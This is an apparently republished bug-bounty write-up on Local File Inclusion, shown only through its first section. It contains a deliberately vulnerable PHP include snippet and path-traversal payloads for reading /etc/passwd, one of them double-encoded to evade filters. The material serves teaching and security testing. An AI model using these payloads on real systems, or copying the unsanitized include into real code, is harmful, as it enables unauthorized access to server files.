# :globe_with_meridians: “How I Turned an LFI into a $5,000 Payday (And How You Can Too)”

> **Original Source:** [“How I Turned an LFI into a $5,000 Payday (And How You Can Too)”](https://infosecwriteups.com/how-i-turned-an-lfi-into-a-5-000-payday-and-how-you-can-too-2bdf7b719709)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# “How I Turned an LFI into a $5,000 Payday (And How You Can Too)”


Hey, I’m Aman Sharma, a cybersecurity enthusiast always hunting for real-world exploits. After reading about LFI vulnerabilities, I decided to test my skills — and ended up finding a critical flaw that earned me a sweet bounty. Here’s my no-fluff guide to finding and exploiting LFI like a pro.


[free link](https://amannsharmaa.medium.com/how-i-turned-an-lfi-into-a-5-000-payday-and-how-you-can-too-2bdf7b719709?sk=efcd7aaeadb5e9f49b02df824564b4c7)


## Why LFI is a Goldmine for Bug Bounty Hunters


Local File Inclusion (LFI) might sound technical, but it’s one of the easiest ways to read sensitive files or even execute remote code on a server. I discovered this firsthand when I stumbled upon a misconfigured web app that let me peek into `/etc/passwd`—and eventually, escalate to a full-blown RCE (Remote Code Execution).

## 1. The Classic LFI: Path Traversal Tricks


Most LFIs happen because developers forget to sanitize user input. Here’s how I exploited one:


Vulnerable Code:


```
<?php
$page = $_GET['file'];
include("/templates/" . $page . ".php");
?>
```


Attack Payloads That Worked:


- Basic: `?file=../../../../etc/passwd`

- Double Encoding: `?file=%252e%252e%252fetc%252fpasswd` (bypasses weak filters)

---

*Originally published on [Medium](https://infosecwriteups.com/how-i-turned-an-lfi-into-a-5-000-payday-and-how-you-can-too-2bdf7b719709). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
